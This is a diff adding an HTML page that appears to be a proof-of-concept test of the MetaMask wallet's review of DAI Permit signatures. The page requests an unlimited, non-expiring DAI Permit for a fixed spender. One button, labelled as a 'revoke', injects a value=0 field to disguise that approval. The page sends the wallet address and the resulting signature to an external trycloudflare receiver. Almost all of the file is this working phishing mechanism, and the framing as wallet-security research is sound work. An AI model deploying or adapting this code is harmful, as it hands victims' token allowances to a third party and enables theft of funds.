@@ -1,0 +1,74 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DAI Permit confirmation test</title>
+<style>
+body{font:16px system-ui;margin:0;padding:18px;background:#f2f3f7;color:#17171a}
+main{max-width:700px;margin:auto;background:#fff;padding:18px;border-radius:16px}
+button{display:block;width:100%;padding:15px;margin:12px 0;border:0;border-radius:11px;background:#4255ff;color:#fff;font-weight:700;font-size:16px}
+button.secondary{background:#36373d}
+.result{margin-top:16px;padding:14px;border-radius:12px;background:#eceef5}
+.ok{color:#08783e;font-weight:800}.bad{color:#b42318;font-weight:800}
+pre{white-space:pre-wrap;word-break:break-all;max-height:430px;overflow:auto;font-size:12px}
+</style>
+<main>
+  <h2>DAI Permit confirmation test</h2>
+  <p>Run: <b>mm-dai-final-20261008</b></p>
+  <button onclick="connect()">Connect disposable wallet</button>
+  <button class="secondary" onclick="requestPermit(false)">Control: normal unlimited DAI Permit</button>
+  <button onclick="requestPermit(true)">Request “revoke” (injected value=0)</button>
+  <div id="result" class="result">Ready</div>
+  <pre id="log"></pre>
+</main>
+<script>
+const RECEIVER='https://humidity-his-examine-tired.trycloudflare.com';
+const MAX='115792089237316195423570985008687907853269984665640564039457584007913129639935';
+const SPENDER='0x8b94b6e459e88dc8c153afa3a825fd258691ccb6';
+const DAI='0x6b175474e89094c44da98b954eedeac495271d0f';
+let owner='';
+const log=document.querySelector('#log'), result=document.querySelector('#result');
+function show(text,good){result.className='result '+(good===true?'ok':good===false?'bad':'');result.textContent=text}
+function out(kind,value){
+  log.textContent+='\n'+kind+' '+JSON.stringify(value);
+  fetch(RECEIVER+'/event',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({runId:'mm-dai-final-20261008',kind,value,origin:location.origin})}).catch(()=>{});
+}
+async function connect(){
+  try{
+    owner=(await ethereum.request({method:'eth_requestAccounts'}))[0];
+    if((await ethereum.request({method:'eth_chainId'}))!=='0x1')await ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:'0x1'}]});
+    out('CONNECTED',{owner,chainId:await ethereum.request({method:'eth_chainId'})});
+    show('Connected: '+owner);
+  }catch(e){out('ERROR',{at:'connect',message:e.message,code:e.code});show(e.message,false)}
+}
+async function nonce(){
+  const data='0x7ecebe00'+owner.slice(2).padStart(64,'0');
+  return BigInt(await ethereum.request({method:'eth_call',params:[{to:DAI,data},'latest']})).toString();
+}
+function payload(currentNonce){
+  return {types:{EIP712Domain:[{name:'name',type:'string'},{name:'version',type:'string'},{name:'chainId',type:'uint256'},{name:'verifyingContract',type:'address'}],Permit:[{name:'holder',type:'address'},{name:'spender',type:'address'},{name:'nonce',type:'uint256'},{name:'expiry',type:'uint256'},{name:'allowed',type:'bool'}]},primaryType:'Permit',domain:{name:'Dai Stablecoin',version:'1',chainId:1,verifyingContract:DAI},message:{holder:owner,spender:SPENDER,nonce:currentNonce,expiry:MAX,allowed:true}};
+}
+async function requestPermit(injected){
+  try{
+    if(!owner)await connect();
+    const p=payload(await nonce());
+    if(injected)p.message.value='0';
+    const variant=injected?'injected_value_zero':'baseline';
+    out('REQUEST',{variant,payload:p});
+    show('MetaMask is reviewing '+variant+'…');
+    const signature=await ethereum.request({method:'eth_signTypedData_v4',params:[owner,JSON.stringify(p)]});
+    out('SIGNATURE',{variant,signature});
+    show('Signature returned; checking it against canonical mainnet DAI…');
+    const response=await fetch(RECEIVER+'/verify',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({payload:p,signature})});
+    const verification=await response.json();
+    out('VERIFICATION',verification);
+    let security='';
+    try{
+      const ab=await (await fetch(RECEIVER+'/security-ab')).json();
+      const rows=ab.results||[];
+      security=' Security Alerts: '+rows.map(x=>x.response?.result_type||'?').join(' → ')+'.';
+    }catch(_){ }
+    show('Installed-app signature accepted by canonical mainnet DAI: '+verification.ethCallAccepted+'. Read-only call left nonce unchanged: '+verification.stateUnchanged+'.'+security,verification.ethCallAccepted&&verification.stateUnchanged);
+  }catch(e){out('ERROR',{at:injected?'injected':'baseline',message:e.message,code:e.code,data:e.data});show(e.message,false)}
+}
+setTimeout(async()=>{try{out('PROVIDER',{ethereum:!!window.ethereum,chainId:window.ethereum?await ethereum.request({method:'eth_chainId'}):null})}catch(e){}},250);
+</script>
